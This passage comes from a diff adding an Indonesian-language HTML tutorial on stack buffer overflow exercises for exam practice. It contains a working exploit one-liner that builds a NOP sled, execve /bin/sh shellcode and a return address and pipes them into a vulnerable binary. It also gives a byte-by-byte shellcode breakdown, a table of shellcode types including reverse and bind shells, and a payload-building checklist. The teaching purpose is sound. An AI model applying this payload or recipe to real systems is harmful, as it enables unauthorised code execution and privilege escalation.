+<span class="cm"># Bagian 4: Return address (titik tengah NOP sled)</span>
+<span class="cm"># 0xbffff434 dalam little-endian:</span>
+<span class="hi">\x34\xf4\xff\xbf</span>
+
+<span class="cm"># Command Python:</span>
+python3 -c "
+import sys
+nop    = b'\x90' * 105
+shell  = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
+pad    = b'A' * 8
+ret    = b'\x34\xf4\xff\xbf'
+sys.stdout.buffer.write(nop + shell + pad + ret)
+" | ./vuln
+    </div>
+  </div>
+</div>
+
+<!-- S2 STEP 4 -->
+<div class="step-panel" id="s2-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Visualisasi mengapa NOP sled berhasil</div>
+    <h3>Tiga skenario: alamat tepat, terlalu awal, terlalu akhir</h3>
+    <div style="display:flex;flex-direction:column;gap:.5rem;margin:.5rem 0">
+      <div style="padding:.6rem;background:#EAF3DE;border:0.5px solid #97C459;border-radius:8px;font-size:12px">
+        <div style="font-weight:500;color:#27500A;margin-bottom:4px">Skenario 1: CPU loncat ke tengah NOP sled</div>
+        <div style="font-family:monospace;color:#3B6D11">→ NOP NOP NOP ... → SHELLCODE → /bin/sh ✓</div>
+      </div>
+      <div style="padding:.6rem;background:#EAF3DE;border:0.5px solid #97C459;border-radius:8px;font-size:12px">
+        <div style="font-weight:500;color:#27500A;margin-bottom:4px">Skenario 2: CPU loncat ke awal NOP sled</div>
+        <div style="font-family:monospace;color:#3B6D11">→ NOP NOP ... (panjang) ... → SHELLCODE → /bin/sh ✓</div>
+      </div>
+      <div style="padding:.6rem;background:#FCEBEB;border:0.5px solid #F09595;border-radius:8px;font-size:12px">
+        <div style="font-weight:500;color:#791F1F;margin-bottom:4px">Skenario 3: CPU loncat terlalu jauh (melewati shellcode)</div>
+        <div style="font-family:monospace;color:#A32D2D">→ CRASH atau instruksi acak ✗</div>
+      </div>
+    </div>
+
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin:.75rem 0">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Jawaban soal</div>
+      <div class="big-ans">NOP(105) + Shellcode(23) + Pad(8) + RetAddr(4) = 140 byte</div>
+    </div>
+
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #D85A30">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Tips NOP sled di soal ujian</p>
+      <p style="font-size:12px">1. NOP sled = buffer_size - len(shellcode) byte sebelum shellcode</p>
+      <p style="font-size:12px">2. Return address tujukan ke TENGAH NOP sled untuk toleransi max</p>
+      <p style="font-size:12px">3. Makin besar buffer → makin besar NOP sled → makin reliable</p>
+      <p style="font-size:12px">4. NOP byte: \x90 (x86). Di arsitektur lain berbeda!</p>
+      <p style="font-size:12px;color:#A32D2D;margin-top:4px">NOP sled tidak bekerja kalau ASLR penuh aktif — perlu bypass ASLR dulu</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end soal2 -->
+
+<!-- ============================================================ -->
+<!-- ANALISIS BYTE -->
+<!-- ============================================================ -->
+<div id="sec-bytes" class="sec">
+  <div class="card">
+    <div class="step-title">Analisis — Diseksi shellcode byte per byte</div>
+    <h3>Mengapa setiap byte dipilih dengan hati-hati</h3>
+    <p style="margin-bottom:.75rem">Shellcode bukan kode biasa — ada constraint ketat yang harus dipenuhi:</p>
+    <div class="grid2" style="margin:.5rem 0">
+      <div style="padding:.6rem;background:#FCEBEB;border:0.5px solid #F09595;border-radius:8px">
+        <p style="font-size:11px;font-weight:500;color:#791F1F;margin-bottom:4px">Tidak boleh ada \x00</p>
+        <p style="font-size:11px;color:#A32D2D">strcpy/gets berhenti di null byte → payload terpotong sebelum selesai.</p>
+      </div>
+      <div style="padding:.6rem;background:#FAEEDA;border:0.5px solid #FAC775;border-radius:8px">
+        <p style="font-size:11px;font-weight:500;color:#633806;margin-bottom:4px">Tidak boleh ada \x0a (newline)</p>
+        <p style="font-size:11px;color:#854F0B">gets() berhenti di newline — payload terpotong juga.</p>
+      </div>
+    </div>
+    <table class="tbl" style="margin:.75rem 0">
+      <tr><th>Bytes</th><th>Assembly</th><th>Kenapa tidak pakai cara langsung?</th></tr>
+      <tr><td>\x31\xc0</td><td>xor eax, eax</td><td>mov eax, 0 → menghasilkan \x00 di opcode!</td></tr>
+      <tr><td>\x31\xc9</td><td>xor ecx, ecx</td><td>Sama — xor lebih pendek dan null-free</td></tr>
+      <tr><td>\x68\x2f\x2f\x73\x68</td><td>push "//sh"</td><td>"/bin/sh" butuh 7 byte, harus dibagi dua push. // = /bin/sh tetap valid di Linux</td></tr>
+      <tr><td>\xb0\x0b</td><td>mov al, 11</td><td>mov eax, 11 → \xb8\x0b\x00\x00\x00 ada null! Pakai mov al saja.</td></tr>
+      <tr><td>\xcd\x80</td><td>int 0x80</td><td>Linux x86 syscall interrupt</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Analisis — Tabel perbandingan jenis shellcode</div>
+    <h3>Shellcode untuk kebutuhan berbeda</h3>
+    <table class="tbl">
+      <tr><th>Jenis</th><th>Tujuan</th><th>Ukuran khas</th><th>Dipakai saat</th></tr>
+      <tr><td>execve /bin/sh</td><td>Buka local shell</td><td>23–45 byte</td><td>Akses lokal ke server</td></tr>
+      <tr><td>execve /bin/sh (setuid)</td><td>Privilege escalation</td><td>~50 byte</td><td>Program SUID root</td></tr>
+      <tr><td>Reverse shell</td><td>Koneksi balik ke attacker</td><td>~70–120 byte</td><td>Server di balik firewall</td></tr>
+      <tr><td>Bind shell</td><td>Buka port menunggu koneksi</td><td>~80–150 byte</td><td>Akses dari jaringan</td></tr>
+      <tr><td>Read file</td><td>Baca /etc/passwd dll</td><td>~40–60 byte</td><td>Data exfiltration</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Analisis — Checklist mengerjakan soal shellcode</div>
+    <h3>Langkah sistematis untuk soal apapun</h3>
+    <div style="display:flex;flex-direction:column;gap:.4rem;font-size:12px;margin:.5rem 0">
+      <div style="padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;margin-bottom:2px">Step 1: Hitung offset ke return address</div>
+        <div style="color:#555">offset = alamat_ret_addr - alamat_buffer (atau dari GDB: info frame)</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;margin-bottom:2px">Step 2: Cek ada atau tidaknya bad bytes</div>
+        <div style="color:#555">Fungsi apa yang membaca input? gets=no \x0a, strcpy=no \x00, dll</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;margin-bottom:2px">Step 3: Tentukan ukuran NOP sled</div>
+        <div style="color:#555">NOP = offset - len(shellcode). Kalau offset terlalu kecil, tidak bisa pakai NOP sled.</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;margin-bottom:2px">Step 4: Tentukan return address</div>
+        <div style="color:#555">Jika alamat tepat diketahui: pakai itu. Jika tidak: incar tengah NOP sled.</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;margin-bottom:2px">Step 5: Encode return address ke little-endian</div>
+        <div style="color:#555">0xdeadbeef → \xef\xbe\xad\xde (balik per byte)</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#FAECE7;border-left:3px solid #D85A30;border-radius:0 6px 6px 0">
+        <div style="font-weight:500;color:#4A1B0C;margin-bottom:2px">Step 6: Susun payload final</div>
+        <div style="color:#712B13">[NOP sled][shellcode][padding ke ret addr][ret addr little-endian]</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const state={
+  s1:{cur:0,total:7},
+  s2:{cur:0,total:5}
+};
+function renderDots(id){
+  const s=state[id];
+  const d=document.getElementById(id+'-dots');
+  d.innerHTML='';
+  for(let i=0;i<s.total;i++){
+    const b=document.createElement('button');
+    b.className='dot';
+    b.style.cssText=i<s.cur?'background:#F0997B':i===s.cur?'background:#D85A30;width:24px;border-radius:5px':'background:#ccc';
+    b.onclick=(()=>{const j=i;return()=>goStep(id,j)})();
+    d.appendChild(b);
+  }
+}
+function goStep(id,n){
+  const s=state[id];
+  document.getElementById(id+'-step-'+s.cur).classList.remove('active');
+  s.cur=n;
+  document.getElementById(id+'-step-'+n).classList.add('active');
+  document.getElementById(id+'-counter').textContent=(n+1)+' / '+s.total;
+  document.getElementById(id+'-prev').disabled=n===0;
+  document.getElementById(id+'-next').disabled=n===s.total-1;
+  renderDots(id);
+}
+function nextStep(id){const s=state[id];if(s.cur<s.total-1)goStep(id,s.cur+1);}
+function prevStep(id){const s=state[id];if(s.cur>0)goStep(id,s.cur-1);}
+function showSec(name){
+  document.querySelectorAll('.sec').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('sec-'+name).classList.add('active');
+  event.target.classList.add('active');
+}
+renderDots('s1');
+renderDots('s2');
+</script>
+</body>
+</html>
